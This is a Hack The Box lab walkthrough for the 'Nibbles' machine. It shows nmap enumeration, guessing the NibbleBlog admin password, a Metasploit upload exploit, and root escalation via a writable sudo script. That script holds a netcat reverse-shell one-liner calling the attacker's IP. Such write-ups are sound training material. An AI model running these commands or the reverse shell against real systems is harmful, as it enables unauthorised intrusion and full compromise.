---
layout: default
title: NIBBLES
description: by Hack The Box
---

<h3 align="center">
Nibbles is a Linux machine with a vulnerability in the NibbleBlog System that allows arbritary file upload using the image upload plugin.
</h3>

# Enumeration

1. Start with an NMAP scan

```
nmap 10.10.10.75 -A -T4

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 03:10 EST
Nmap scan report for 10.10.10.75
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

2. 2 Ports open. 22 and 80. Look the website -> boring! Nothing under the hood too. Literally said "/nibbleblog/ directory. Nothing interesting here!"
3. Google'd Nibble blog and found that its a blog system. Checked for vuln and got a hit in searchsploit. Time to check the version of this website. Looked into the header using burp suite and found the following items:

   - Nibbleblog 3.0 and 4.0.3 is vulnerable
   - Server: Apache/2.4.18 (Ubuntu)

4. Found a local privesc for Apache 2.4.18... but we need a foothold first
5. Got nothing on Gobuster and FFUF'ing
6. Hahaha! Just realised that the comment in the HTML content of the page is an actual directory... scrap what I said in No.2
7. Found these items too:

   - Email: admin@nibbles.com
   - user: 0015145441311512964659116401634551

8. After fuzzing the new directory "//10.10.10.75/nibbleblog/"... found new directories:

   - content
   - themes
   - admin.php

# FootHold

9. Funniest thing is that the simplest thing worked! Tried to type in a password using burp intruder and got a hit on admin:nibbles
10. I'm in! Let's see what I can do as "admin" username.

    - Version: 4.0.3

11. Now that I am sure of the version of this blog. I know I can use metasploit on it. >>> running msfconsole
12. In metasploit >>> set rhost, username: admin, passsword: nibbles, targeturi: /nibbleblog
13. After getting a m-shell, I found the user flag in /home/nibbler/user.txt

# Root

14. Now we'll try to enumerate further... I can't cd in to the /root folder (no surprise). And I dont want the try the privesc from the Apache 2.14.18 vuln because that means I have to wait for that time to cycle for the exploit to run. Even then I might get it wrong and will need to wait another 24hrs to try again... arrrgggg!
15. Typing in

    ```
    $ sudo -l
    Matching Defaults entries for nibbler on Nibbles:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User nibbler may run the following commands on Nibbles:
        (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
    $
    ```

    This means... the root user with no password required can actually run a file named monitor.sh if its inside the /home/nibbler/personal/stuff/ folder

16. Looking at the /home/nibbler folder, there is a personal.zip file. After unzipping this file it basically created the file for me and folder structure for me. (LoL)
17. From here I deleted the file and create a monitor.sh of my own that contains a bind shell one liner!

    ```
    (Create the file)
        $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.194 4444 > /tmp/f" > monitor.sh

    (Verify)
        $ ls
        monitor.sh

    (Run the a listener)
        ┌──(schoon3r㉿nexer)-[~/HTB]
        └─$ nc -nvlp 4444
        listening on [any] 4444 ...

    (Run the newly create monitor.sh file)
        $ sudo ./monitor.sh

    (Yay! Shellsssss!!!!)
        connect to [10.10.17.194] from (UNKNOWN) [10.10.10.75] 53904
        /bin/sh: 0: can't access tty; job control turned off
        # ls
        monitor.sh
        # whoami
        root
        # pwd
        /home/nibbler/personal/stuff
        # cd /root/
        # ls
        root.txt
        # cat root.txt
        9*4*d*1*6...
    ```

<br><br>

# Reference

1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
2. https://yolospacehacker.com/fr/toolbox.php?id=ncbindnoe

<br><br>

[back to HOME](./)
